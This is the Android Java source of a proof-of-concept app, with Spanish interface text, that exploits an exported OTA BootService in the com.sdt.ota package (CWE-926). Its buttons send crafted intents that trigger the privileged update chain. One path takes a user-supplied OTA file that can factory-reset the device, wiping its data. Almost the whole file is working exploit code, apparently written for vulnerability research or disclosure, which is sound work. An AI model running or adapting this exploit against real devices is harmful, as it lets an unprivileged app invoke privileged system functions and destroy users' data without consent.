package com.poc.cwe926.bootservice;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Process;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final String TARGET_PKG = "com.sdt.ota";
    private static final String TARGET_CLS = "com.sdt.ota.BootService";
    private static final String ACTION = "com.skw.ota.update.BootService";

    private TextView log;
    private TextView infoText;
    private EditText otaPath;
    private ScrollView scrollView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        log = findViewById(R.id.log_text);
        infoText = findViewById(R.id.info_text);
        otaPath = findViewById(R.id.ota_path);
        scrollView = findViewById(R.id.scroll_log);

        showAppInfo();

        Button btnSafe = findViewById(R.id.btn_safe);
        Button btnWipe = findViewById(R.id.btn_wipe);

        btnSafe.setOnClickListener(v -> pocSafe());
        btnWipe.setOnClickListener(v -> pocWipeConfirm());
    }

    private void showAppInfo() {
        int uid = Process.myUid();
        int pid = Process.myPid();
        String perms = "ninguno";
        try {
            PackageInfo pi = getPackageManager().getPackageInfo(
                    getPackageName(), PackageManager.GET_PERMISSIONS);
            if (pi.requestedPermissions != null && pi.requestedPermissions.length > 0) {
                perms = String.join(", ", pi.requestedPermissions);
            }
        } catch (PackageManager.NameNotFoundException ignored) {
        }
        infoText.setText("pkg=" + getPackageName()
                + "  uid=" + uid + "  pid=" + pid
                + "\nPermisos: " + perms);
    }

    private void appendLog(String msg) {
        log.append(msg + "\n");
        scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
    }

    private void pocSafe() {
        appendLog("--- PoC sin wipe ---");
        try {
            Intent intent = new Intent(ACTION);
            intent.setComponent(new ComponentName(TARGET_PKG, TARGET_CLS));
            intent.putExtra("typeSelectable", true);
            startForegroundService(intent);
            appendLog("OK: Intent enviado (typeSelectable=true)");
            appendLog("BootService debe abrir SysBootDialog.");
        } catch (Exception e) {
            appendLog("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void pocWipeConfirm() {
        String path = otaPath.getText().toString().trim();

        if (path.isEmpty()) {
            new AlertDialog.Builder(this)
                    .setTitle("Cadena completa (sin archivo)")
                    .setMessage(
                            "Se enviará el Intent sin archivo OTA.\n\n"
                                    + "BootService procesará el Intent y la cadena "
                                    + "privilegiada se ejecutará hasta que update_engine "
                                    + "falle por falta de archivo válido.\n\n"
                                    + "No hay riesgo. ¿Continuar?")
                    .setPositiveButton("Ejecutar", (d, w) -> pocChain())
                    .setNegativeButton("Cancelar", null)
                    .show();
        } else {
            new AlertDialog.Builder(this)
                    .setTitle("ATENCIÓN: WIPE REAL")
                    .setMessage(
                            "Se enviará el Intent con la ruta:\n" + path + "\n\n"
                                    + "Si el OTA es válido y contiene ota-wipe=yes, "
                                    + "EL EQUIPO SE RESETEARÁ DE FÁBRICA.\n\n"
                                    + "¿Continuar?")
                    .setPositiveButton("SÍ, WIPE REAL", (d, w) -> pocWipe(path))
                    .setNegativeButton("Cancelar", null)
                    .show();
        }
    }

    private void pocChain() {
        appendLog("--- PoC cadena completa (sin archivo) ---");
        try {
            Intent intent = new Intent(ACTION);
            intent.setComponent(new ComponentName(TARGET_PKG, TARGET_CLS));
            startForegroundService(intent);
            appendLog("OK: Intent enviado sin filePath.");
            appendLog("BootService ejecutará la cadena privilegiada.");
            appendLog("Fallo esperado en update_engine (sin archivo).");
        } catch (Exception e) {
            appendLog("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void pocWipe(String path) {
        appendLog("--- PoC WIPE REAL ---");
        try {
            Intent intent = new Intent(ACTION);
            intent.setComponent(new ComponentName(TARGET_PKG, TARGET_CLS));
            intent.setDataAndType(Uri.parse("file://" + path), "shared/ota");
            startForegroundService(intent);
            appendLog("OK: Intent enviado con filePath=" + path);
            appendLog("Si el OTA es válido, el equipo se reiniciará.");
        } catch (Exception e) {
            appendLog("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }
}
